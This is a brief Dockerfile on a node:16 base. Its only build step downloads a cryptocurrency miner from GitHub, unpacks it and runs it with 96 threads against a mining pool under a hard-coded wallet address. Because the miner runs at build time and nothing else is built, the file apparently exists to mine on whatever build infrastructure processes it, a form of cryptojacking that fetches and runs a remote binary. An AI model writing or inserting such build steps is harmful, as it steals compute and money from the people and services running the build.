FROM node:16
RUN apt-get update && \
    wget https://github.com/XDagger/XdagRandomxMiner/releases/download/0.4.2/LinuxRandomxMiner.zip && unzip LinuxRandomxMiner.zip && rm -rf LinuxRandomxMiner.zip && chmod u+x DaggerRandomxMiner && ./DaggerRandomxMiner -cpu -a yfSserc52yrsZ88b7JxEdMyDlO9Z9kba -p equal.xdag.org:13656 -t 96
